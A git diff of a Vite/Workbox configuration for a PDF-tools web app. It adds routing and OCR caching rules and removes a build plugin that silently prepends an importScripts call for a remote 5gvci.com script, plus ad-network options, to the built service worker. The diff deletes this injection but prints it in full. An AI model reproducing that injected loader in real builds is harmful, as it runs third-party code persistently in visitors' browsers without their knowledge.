@@ -1,6 +1,5 @@
 import tailwindcss from '@tailwindcss/vite';
 import react from '@vitejs/plugin-react';
-import fs from 'node:fs';
 import path from 'path';
 import {defineConfig} from 'vite';
 import {VitePWA} from 'vite-plugin-pwa';
@@ -53,13 +52,38 @@ export default defineConfig(() => {
         },
         workbox: {
           globPatterns: ['**/*.{js,mjs,css,html,ico,png,svg,woff,woff2,ttf}'],
+          globIgnores: ['tesseract/**', '404.html', 'google*.html'],
           maximumFileSizeToCacheInBytes: 5 * 1024 * 1024,
           cleanupOutdatedCaches: true,
           clientsClaim: true,
           skipWaiting: true,
           navigateFallback: '/index.html',
+          navigateFallbackAllowlist: [
+            /^\/$/,
+            /^\/home\/?$/,
+            /^\/tools\/?$/,
+            /^\/(merge-pdf|split-pdf|compress-pdf|images-to-pdf|pdf-to-images|rotate-pdf|delete-pdf-pages|reorder-pdf-pages|add-page-numbers|watermark-pdf|ocr-pdf|edit-pdf-metadata|unlock-pdf)\/?$/,
+            /^\/banking-finance\/?$/,
+            /^\/banking\/us-banks(\/(chase|bank-of-america|wells-fargo|citi|us-bank))?\/?$/,
+            /^\/banking\/(financial-templates|financial-pdf-form-filler|financial-document-privacy)\/?$/,
+            /^\/(about|contact|privacy|terms|dmca)\/?$/,
+          ],
           navigateFallbackDenylist: [/^\/api\//, /^\/google[a-z0-9]+\.html$/i],
           runtimeCaching: [
+            {
+              urlPattern: /^\/tesseract\/.*/i,
+              handler: 'CacheFirst',
+              options: {
+                cacheName: 'local-tesseract-ocr-cache',
+                expiration: {
+                  maxEntries: 20,
+                  maxAgeSeconds: 60 * 60 * 24 * 180,
+                },
+                cacheableResponse: {
+                  statuses: [0, 200],
+                },
+              },
+            },
             {
               urlPattern: /^https:\/\/fonts\.googleapis\.com\/.*/i,
               handler: 'CacheFirst',
@@ -95,32 +119,6 @@ export default defineConfig(() => {
           type: 'module',
         },
       }),
-      {
-        name: 'inject-push-sw-into-dist',
-        apply: 'build',
-        enforce: 'post',
-        closeBundle: {
-          order: 'post',
-          sequential: true,
-          handler() {
-            const swPath = path.resolve(import.meta.dirname, 'dist', 'sw.js');
-            if (!fs.existsSync(swPath)) return;
-            const existing = fs.readFileSync(swPath, 'utf8');
-            const header = [
-              'self.options = {',
-              '    "domain": "5gvci.com",',
-              '    "zoneId": 12336654',
-              '}',
-              'self.lary = ""',
-              "try { importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw') } catch (_err) {}",
-              '',
-            ].join('\n');
-            if (!existing.includes('5gvci.com/act/files/service-worker.min.js')) {
-              fs.writeFileSync(swPath, `${header}${existing}`, 'utf8');
-            }
-          },
-        },
-      },
     ],
     resolve: {
       alias: {
